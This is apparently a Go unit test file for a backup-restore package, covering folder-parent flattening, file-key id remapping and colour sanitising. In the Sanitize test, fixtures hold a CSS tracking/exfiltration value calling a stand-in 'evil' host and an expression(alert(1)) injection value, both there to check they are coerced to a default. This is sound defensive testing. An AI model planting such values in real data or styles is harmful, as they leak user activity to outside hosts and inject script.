package backup

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func int64Ptr(v int64) *int64 { return &v }

func TestNormalizeRestoreFolderParents(t *testing.T) {
	folders := []FolderRow{
		{ID: 3, ParentID: int64Ptr(2)},
		{ID: 2, ParentID: int64Ptr(1)},
		{ID: 1},
		{ID: 4, ParentID: int64Ptr(99)},
		{ID: 5, ParentID: int64Ptr(6)},
		{ID: 6, ParentID: int64Ptr(5)},
	}
	parents := normalizeRestoreFolderParents(folders)
	requireParent := func(index int) int64 {
		t.Helper()
		if parents[index] == nil {
			t.Fatalf("parent %d is nil", index)
		}
		return *parents[index]
	}
	assert.EqualValues(t, 2, requireParent(0))
	assert.EqualValues(t, 1, requireParent(1))
	assert.Nil(t, parents[2])
	assert.Nil(t, parents[3], "dangling parent must flatten to root")
	assert.Nil(t, parents[4], "the first row in a cycle must become a root")
	assert.EqualValues(t, 5, requireParent(5), "remaining cycle members may attach to the new root")
}

// TestRemapFileKey covers the id mapping helper used by ModeDuplicate.
func TestRemapFileKey(t *testing.T) {
	m := newIDMapping()
	m.linkMap[123] = 456

	cases := []struct {
		in     string
		out    string
		mapped bool
	}{
		{"screenshots/123.png", "screenshots/456.png", true},
		{"screenshots/123.550e8400-e29b-41d4-a716-446655440000.jpg", "screenshots/456.550e8400-e29b-41d4-a716-446655440000.jpg", true},
		{"images/123.jpg", "images/456.jpg", true},
		{"screenshots/999.png", "screenshots/999.png", false}, // no mapping
		{"other/123.png", "other/123.png", false},             // unknown prefix
		{"screenshots/notanumber.png", "screenshots/notanumber.png", false},
		{"screenshots/.png", "screenshots/.png", false}, // dot at zero — no id
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got, ok := m.remapFileKey(tc.in)
			assert.Equal(t, tc.out, got)
			assert.Equal(t, tc.mapped, ok)
		})
	}
}

// TestRemapFileKey_IdentityStillCountsAsMapped pins the CHANGED meaning of
// remapFileKey's boolean. It used to answer "did the key change", so an
// identity mapping (old id == new id) reported false.
//
// It now answers "did THIS restore produce the link this key names", because
// applyFiles uses false to DROP the entry — object keys are flat, so honouring
// a key the restore did not produce would write over whichever tenant currently
// holds that id. Under the old meaning an identity mapping would be discarded,
// silently losing a legitimate image; under the new one it is kept, and only a
// genuinely unmapped key is refused.
func TestRemapFileKey_IdentityStillCountsAsMapped(t *testing.T) {
	m := newIDMapping()
	m.linkMap[7] = 7
	got, ok := m.remapFileKey("screenshots/7.png")
	assert.Equal(t, "screenshots/7.png", got)
	assert.True(t, ok, "a link this restore produced is mapped even when the id is unchanged")

	// The contrast that matters: an id this restore never produced.
	got, ok = m.remapFileKey("screenshots/8.png")
	assert.Equal(t, "screenshots/8.png", got)
	assert.False(t, ok, "an unmapped id must be refused so applyFiles drops the entry")
}

// TestSnapshot_Sanitize is the security-boundary guard: a snapshot loaded
// from an attacker-controlled backup zip can carry `red url("https://evil/exfil")`
// as a tag/folder color, which would render as a tracking pixel on every chip
// (CLAUDE.md §4). Sanitize must coerce every such value to the indigo default
// before any restore mode writes it to the DB.
func TestSnapshot_Sanitize(t *testing.T) {
	s := &Snapshot{
		Tags: []TagRow{
			{ID: 1, Name: "ok-hex", Color: "#abc"},
			{ID: 2, Name: "ok-gradient", Color: "linear-gradient(135deg, #8B85FF, #6366F1)"},
			{ID: 3, Name: "empty", Color: ""},
			{ID: 4, Name: "tracking-pixel", Color: `red url("https://evil/exfil")`},
			{ID: 5, Name: "named", Color: "red"},
		},
		Folders: []FolderRow{
			{ID: 1, Name: "ok", Color: "#aabbcc"},
			{ID: 2, Name: "css-injection", Color: "expression(alert(1))"},
		},
	}
	coerced := s.Sanitize()

	assert.Equal(t, "#abc", s.Tags[0].Color, "valid hex passes through")
	assert.Equal(t, "linear-gradient(135deg, #8B85FF, #6366F1)", s.Tags[1].Color, "valid gradient passes through")
	assert.Equal(t, defaultColor, s.Tags[2].Color, "empty falls back to default")
	assert.Equal(t, defaultColor, s.Tags[3].Color, "tracking-pixel vector MUST be coerced")
	assert.Equal(t, defaultColor, s.Tags[4].Color, "named color coerced")
	assert.Equal(t, "#aabbcc", s.Folders[0].Color, "folder valid hex passes through")
	assert.Equal(t, defaultColor, s.Folders[1].Color, "folder expression() coerced")

	// 4 coercions: tag empty, tag url(), tag named, folder expression().
	// Valid colors (including gradient) pass through untouched.
	assert.Equal(t, 4, coerced, "coerced count must reflect only the actually-changed values")
}

func TestSnapshot_Sanitize_Empty(t *testing.T) {
	s := &Snapshot{}
	assert.Equal(t, 0, s.Sanitize(), "empty snapshot coerces nothing")
}
